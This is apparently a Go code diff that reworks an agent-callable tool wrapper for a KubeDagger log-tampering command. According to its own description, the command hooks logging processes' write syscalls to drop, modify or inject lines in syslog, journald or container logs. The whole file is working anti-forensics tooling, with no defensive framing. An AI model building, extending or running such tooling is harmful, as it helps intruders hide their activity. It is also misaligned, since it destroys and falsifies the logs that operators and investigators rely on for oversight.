@@ -11,11 +11,9 @@ import (
 )
 
 type LogTamperInput struct {
-	Action  string `json:"action"`
-	Target  string `json:"target,omitempty"`
-	Pattern string `json:"pattern,omitempty"`
-	Replace string `json:"replace,omitempty"`
-	PID     int    `json:"pid,omitempty"`
+	Mode      string `json:"mode,omitempty"`
+	Pattern   string `json:"pattern,omitempty"`
+	LogTarget string `json:"log_target,omitempty"`
 }
 
 type LogTamperTool struct {
@@ -29,36 +27,28 @@ func NewLogTamper(exec executor.Executor) *LogTamperTool {
 func (t *LogTamperTool) Name() string { return "kubedagger_log_tamper" }
 
 func (t *LogTamperTool) Description() string {
-	return "Tamper with log output by hooking write syscalls of logging processes. Can suppress specific log lines, modify content in-flight, or inject false entries. Works on container logs, journald, syslog, and application logs."
+	return "Tamper with log output by hooking write syscalls of logging processes. Drops, modifies, or injects log lines matching a pattern in syslog, journald, or container logs. Patterns are regexes restricted to plain characters (no shell metacharacters such as quotes, parentheses, or pipes)."
 }
 
 func (t *LogTamperTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"mode": {
 				"type": "string",
-				"enum": ["suppress", "modify", "inject", "truncate"],
-				"description": "Tampering action"
-			},
-			"target": {
-				"type": "string",
-				"description": "Target log source (process name, log path, or 'all')"
+				"enum": ["drop", "modify", "inject"],
+				"description": "Tampering mode (default: drop)"
 			},
 			"pattern": {
 				"type": "string",
-				"description": "Pattern to match for suppression/modification"
+				"description": "Regex pattern of log lines to target (no shell metacharacters allowed)"
 			},
-			"replace": {
+			"log_target": {
 				"type": "string",
-				"description": "Replacement content for modify action"
-			},
-			"pid": {
-				"type": "integer",
-				"description": "Target process ID"
+				"enum": ["syslog", "journald", "container"],
+				"description": "Log source to tamper with (default: syslog)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -68,28 +58,22 @@ func (t *LogTamperTool) Execute(ctx context.Context, params json.RawMessage) (*m
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Target, "target"); err != nil {
-		return errorResult(err.Error()), nil
-	}
+	// Note: the executor rejects shell metacharacters, so regex patterns are
+	// validated with validateSafeString exactly like every other free-text
+	// field; complex regexes must be expressed without those characters.
 	if err := validateSafeString(input.Pattern, "pattern"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Replace, "replace"); err != nil {
-		return errorResult(err.Error()), nil
-	}
 
-	args := []string{"log-tamper", "--action", input.Action}
-	if input.Target != "" {
-		args = append(args, "--target", input.Target)
+	args := []string{"log-tamper"}
+	if input.Mode != "" {
+		args = append(args, "--mode", input.Mode)
 	}
 	if input.Pattern != "" {
 		args = append(args, "--pattern", input.Pattern)
 	}
-	if input.Replace != "" {
-		args = append(args, "--replace", input.Replace)
-	}
-	if input.PID > 0 {
-		args = append(args, "--pid", fmt.Sprintf("%d", input.PID))
+	if input.LogTarget != "" {
+		args = append(args, "--log-target", input.LogTarget)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -103,7 +87,7 @@ func (t *LogTamperTool) Execute(ctx context.Context, params json.RawMessage) (*m
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Log Tamper: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Log Tamper\n\n")
 	if output == "" {
 		sb.WriteString("Tamper active.\n")
 	} else {
